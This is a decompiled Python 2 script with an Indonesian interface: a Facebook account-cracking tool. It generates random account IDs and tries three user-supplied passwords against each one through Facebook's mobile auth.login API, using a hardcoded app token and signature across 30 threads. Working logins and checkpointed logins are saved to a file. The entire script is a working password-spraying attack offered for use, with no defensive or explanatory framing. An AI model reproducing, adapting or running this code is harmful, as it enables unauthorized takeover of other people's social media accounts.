# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Auto Dis Parser 2.2.0
# Source File : patched.pyc
# Bytecode Version : 2.7
#---------------------------------------

#!/usr/bin/python2
# coding=utf-8
# Coding by : Muhammad Rizky
# Izin Dulu Bos Kalo Mau Recode
# Fb.com/Rizky.Rasata
import os, sys, random, string, time, datetime, random, hashlib, re, threading, json, urllib, cookielib

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)

def keluar():
    print '[!] Keluar '
    os.sys.exit()

def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)

def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')
    
os.system('clear')
os.system('rm -rf .txt')
print '\x1b[1;97m{\x1b[1;93m•\x1b[1;97m} Contoh \x1b[1;91m:\x1b[1;93m 1000'
nok = int(raw_input('\x1b[1;97m{\x1b[1;92m•\x1b[1;97m} Jumlah yg ingin anda crack \x1b[1;91m:\x1b[1;92m '))
jalan('\x1b[1;97m{\x1b[1;95m•\x1b[1;97m} Tunggu sedang membuat file ... ')
time.sleep(2)
for n in range(nok):
    nm = random.randint(1111, 11111)
    sys.stdout = open('.txt', 'a')
    print nm
    sys.stdout.flush()

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 pro.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

####### LOGO ########
logo = """  \033[1;92m
 ▒█████   ██▓    ▓█████▄    
▒██▒  ██▒▓██▒    ▒██▀ ██▌ 
▒██░  ██▒▒██░    ░██   ██ 
▒██   ██░▒██░    ░▓█▄   ▌ \033[1;96m> \033[1;97mAT \033[1;91m:\033[1;97m muhammad rizky\033[1;92m
░ ████▓▒░░██████▒░▒████▓  \033[1;96m> \033[1;97mGH \033[1;91m:\033[1;97m github.com/RIZKY4\033[1;92m
\033[1;91m░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▒▓  ▒  \033[1;96m> \033[1;97mFB \033[1;91m:\033[1;97m fb.me/rizky.rasata\033[1;91m
  ░ ▒ ▒░ ░ ░ ▒  ░ ░ ▒  ▒    
░ ░ ░ ▒    ░ ░    ░ ░  ░    
    ░ ░      ░  ░   ░"""

back = 0
threads = []
cekpoint = []
oks = []
id = []

###### MENU UTAMA #######
def menu_utama():
	os.system('clear')
	print logo
	print "\033[1;95m═════════════════════════════════════════════════════"
	print "\033[1;97m> \033[1;92m01\033[1;97m Mulai Crack "
	print "\033[1;97m> \033[1;91m00\033[1;97m Keluar "
	print "\033[1;95m═════════════════════════════════════════════════════"
	pilih_men()
	
####### PILIH MENU #######
def pilih_men():
	men = raw_input("\033[1;93m︻デ═一▸ \033[1;91m:\033[1;92m ")
	if men =="":
		print"\033[1;97m{\033[1;91m×\033[1;97m} Isi Yg Benar !"
		pilih_men()
	elif men == "1" or men == "01":
		crack_id()
	elif men == "0" or men == "00":
		keluar()
	else:
		print"\033[0;97m{\033[0;91m×\033[0;97m} Isi Yg Benar !"
		pilih_men()
		
##### CRACK ID #####
def crack_id():
	os.system('clear')
	print logo
	try:
		print "\033[1;95m═════════════════════════════════════════════════════"
		print ("\033[1;96m>\033[1;97m Contoh : 100")
		m = raw_input("\033[1;96m>\033[1;97m Kode Awal ID :\033[1;92m ")
		pass1 = raw_input("\033[1;96m>\033[1;97m Sandi 1 :\033[1;92m ")
		pass2 = raw_input("\033[1;96m>\033[1;97m Sandi 2 :\033[1;92m ")
		pass3 = raw_input("\033[1;96m>\033[1;97m Sandi 3 :\033[1;92m ")
		idlist = ('.txt')
		for line in open(idlist,'r').readlines():
			id.append(line.strip())
	except IOError:
		print ("> File tidak ada ")
		raw_input("\n{ Kembali }")
		menu_utama()
		
	print "\033[1;96m>\033[1;97m Total ID :\033[1;92m "+str(len(id))
	print ('\033[1;96m>\033[1;97m Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m> \033[1;97mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;95m═════════════════════════════════════════════════════"
	
##### MAIN ID #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('Love')
		except OSError:
			pass
		try:
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+m+user+"&locale=en_US&password="+pass1+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print "\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL"
				print "\x1b[1;97m{\x1b[1;92m♤\x1b[1;97m} \x1b[1;97mUser\x1b[1;91m  : \x1b[1;92m" +m+user
				print "\x1b[1;97m{\x1b[1;92m♢\x1b[1;97m} \x1b[1;97mSandi \x1b[1;91m: \x1b[1;92m" +pass1
				oke = open("Love/id.txt", "a")
				oke.write("{Berhasil}" +m+user+" | " +pass1+"\n")
				oke.close()
				oks.append(pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print "\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT"
					print "\x1b[1;97m{\x1b[1;93m♤\x1b[1;97m} \x1b[1;97mUser\x1b[1;91m  : \x1b[1;93m" +m+user
					print "\x1b[1;97m{\x1b[1;93m♢\x1b[1;97m} \x1b[1;97mSandi \x1b[1;91m: \x1b[1;93m" +pass1
					cek = open("Love/id.txt", "a")
					cek.write("{Cekpoint}" +m+user+" | " +pass1+"\n")
					cek.close()
					cekpoint.append(user)
				else:
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+m+user+"&locale=en_US&password="+pass2+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print "\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL"
						print "\x1b[1;97m{\x1b[1;92m♤\x1b[1;97m} \x1b[1;97mUser\x1b[1;91m  : \x1b[1;92m" +m+user
						print "\x1b[1;97m{\x1b[1;92m♢\x1b[1;97m} \x1b[1;97mSandi \x1b[1;91m: \x1b[1;92m" +pass2
						oke = open("Love/id.txt", "a")
						oke.write("{Berhasil}" +m+user+" | " +pass2+"\n")
						oke.close()
						oks.append(user)
					else:
						if 'www.facebook.com' in q['error_msg']:
							print "\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT"
							print "\x1b[1;97m{\x1b[1;93m♤\x1b[1;97m} \x1b[1;97mUser\x1b[1;91m  : \x1b[1;93m" +m+user
							print "\x1b[1;97m{\x1b[1;93m♢\x1b[1;97m} \x1b[1;97mSandi \x1b[1;91m: \x1b[1;93m" +pass2
							cek = open("Love/id.txt", "a")
							cek.write("{Cekpoint}" +m+user+" | " +pass2+"\n")
							cek.close()
							cekpoint.append(user)
						else:
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+m+user+"&locale=en_US&password="+pass3+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print "\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL"
								print "\x1b[1;97m{\x1b[1;92m♤\x1b[1;97m} \x1b[1;97mUser\x1b[1;91m  : \x1b[1;92m" +m+user
								print "\x1b[1;97m{\x1b[1;92m♢\x1b[1;97m} \x1b[1;97mSandi \x1b[1;91m: \x1b[1;92m" +pass3
								oke = open("Love/id.txt", "a")
								oke.write("{Berhasil}" +m+user+" | " +pass3+"\n")
								oke.close()
								oks.append(user)
							else:
								if 'www.facebook.com' in q['error_msg']:
									print "\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT"
									print "\x1b[1;97m{\x1b[1;93m♤\x1b[1;97m} \x1b[1;97mUser\x1b[1;91m  : \x1b[1;93m" +m+user
									print "\x1b[1;97m{\x1b[1;93m♢\x1b[1;97m} \x1b[1;97mSandi \x1b[1;91m: \x1b[1;93m" +pass3
									cek = open("Love/id.txt", "a")
									cek.write("{Cekpoint}" +m+user+" | " +pass3+"\n")
									cek.close()
									cekpoint.append(user)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m═══════════════════════════════════════════"
	print '\033[1;96m> \033[1;97mSelesai ...'
	print"\033[1;96m> \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;96m> \033[1;97mCP/OK file tersimpan : Love/id.txt'
	print "\033[1;95m═══════════════════════════════════════════"
	raw_input("\033[1;93m{\033[1;97mKembali\033[1;93m}")
	os.system("python2 old.py")
	
if __name__=='__main__':
	menu_utama()